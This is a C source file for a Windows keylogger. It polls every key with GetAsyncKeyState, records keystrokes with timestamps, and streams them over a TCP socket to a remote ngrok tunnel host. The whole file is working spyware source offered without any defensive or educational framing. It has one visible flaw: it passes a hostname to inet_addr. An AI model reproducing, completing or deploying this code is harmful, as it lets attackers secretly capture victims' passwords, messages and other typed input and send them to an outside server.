#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

//server details
#define SERVER_IP "0.tcp.ngrok.io"  
#define SERVER_PORT 8080           

// Networking variables
SOCKET sock;
HANDLE logMutex; // Mutex for thread-safe logging
char sendBuffer[1024];
int isConnected = 1;

//initialize Winsock and connect to the server
int initializeNetwork() {
    WSADATA wsaData;
    struct sockaddr_in server;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Failed to initialize Winsock. Error Code: %d\n", WSAGetLastError());
        return 0;
    }

    // Create socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Could not create socket. Error Code: %d\n", WSAGetLastError());
        return 0;
    }

    // Set up the server address
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("Connection failed. Error Code: %d\n", WSAGetLastError());
        return 0;
    }

    printf("Connected to server %s:%d\n", SERVER_IP, SERVER_PORT);
    return 1;
}

//send logs to the server
void sendLogs() {
    while (isConnected) {
        WaitForSingleObject(logMutex, INFINITE);

        if (strlen(sendBuffer) > 0) {
            if (send(sock, sendBuffer, strlen(sendBuffer), 0) < 0) {
                printf("Failed to send log. Error Code: %d\n", WSAGetLastError());
                isConnected = 0;
            } else {
                // Clear buffer after sending
                memset(sendBuffer, 0, sizeof(sendBuffer));
            }
        }

        ReleaseMutex(logMutex);
        Sleep(500); 
    }
}

//get the current timestamp
void getTimestamp(char *buffer, size_t bufferSize) {
    time_t rawTime = time(NULL);
    struct tm *timeInfo = localtime(&rawTime);
    strftime(buffer, bufferSize, "[%Y-%m-%d %H:%M:%S]", timeInfo);
}

//map and log keys
void mapAndLogKey(int key, int shiftPressed) {
    char buffer[128] = {0};
    char timestamp[64];

    // Handle printable characters
    if (key >= 0x30 && key <= 0x39) {  // Numbers
        if (shiftPressed) {
            const char *shiftedNumbers = ")!@#$%^&*(";  // Shifted symbols for 0-9
            sprintf(buffer, "%c", shiftedNumbers[key - 0x30]);
        } else {
            sprintf(buffer, "%c", key);
        }
    } else if (key >= 0x41 && key <= 0x5A) {  // Letters
        if (shiftPressed) {
            sprintf(buffer, "%c", key);  // Uppercase
        } else {
            sprintf(buffer, "%c", key + 32);  // Lowercase
        }
    } else {
        // Handle special keys explicitly
        switch (key) {
            case VK_SPACE:
                sprintf(buffer, "[SPACE]");
                break;
            case VK_RETURN:
                sprintf(buffer, "[ENTER]");
                break;
            case VK_TAB:
                sprintf(buffer, "[TAB]");
                break;
            case VK_BACK:
                sprintf(buffer, "[BACKSPACE]");
                break;
            case VK_SHIFT:
                sprintf(buffer, "[SHIFT]");
                break;
            case VK_CONTROL:
                sprintf(buffer, "[CTRL]");
                break;
            case VK_ESCAPE:
                sprintf(buffer, "[ESC]");
                break;
            default:
                sprintf(buffer, "[UNKNOWN:%d]", key);
                break;
        }
    }

    getTimestamp(timestamp, sizeof(timestamp));
    WaitForSingleObject(logMutex, INFINITE);

    // Append timestamp and key to send buffer
    snprintf(sendBuffer + strlen(sendBuffer), sizeof(sendBuffer) - strlen(sendBuffer), "%s %s\n", timestamp, buffer);

    ReleaseMutex(logMutex);
}

// Thread function to capture and log keystrokes
DWORD WINAPI keyloggerThread(LPVOID lpParameter) {
    while (1) {
        for (int key = 8; key <= 255; key++) {  // Key codes from 8 to 255
            if (GetAsyncKeyState(key) & 0x8000) {  // Key is pressed
                int shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) || 
                                   (GetKeyState(VK_CAPITAL) & 0x0001);
                mapAndLogKey(key, shiftPressed);
                Sleep(10);  // Avoid duplicate logging
            }
        }
        Sleep(10);
    }
    return 0;
}


int main() {
    logMutex = CreateMutex(NULL, FALSE, NULL);  // Create a mutex for thread-safe operations

    if (!logMutex) {
        printf("Failed to create mutex. Exiting...\n");
        return 1;
    }

    if (!initializeNetwork()) {
        printf("Failed to initialize network. Exiting...\n");
        return 1;
    }

    // Create threads
    HANDLE hKeyloggerThread = CreateThread(NULL, 0, keyloggerThread, NULL, 0, NULL);
    HANDLE hNetworkThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sendLogs, NULL, 0, NULL);

    if (!hKeyloggerThread || !hNetworkThread) {
        printf("Failed to create threads. Exiting...\n");
        closesocket(sock);
        WSACleanup();
        CloseHandle(logMutex);
        return 1;
    }

    // Keep the main thread running
    printf("Keylogger is running. Press CTRL+C to stop.\n");
    WaitForSingleObject(hKeyloggerThread, INFINITE);
    WaitForSingleObject(hNetworkThread, INFINITE);

    // Cleanup
    closesocket(sock);
    WSACleanup();
    CloseHandle(logMutex);
    CloseHandle(hKeyloggerThread);
    CloseHandle(hNetworkThread);

    return 0;
}

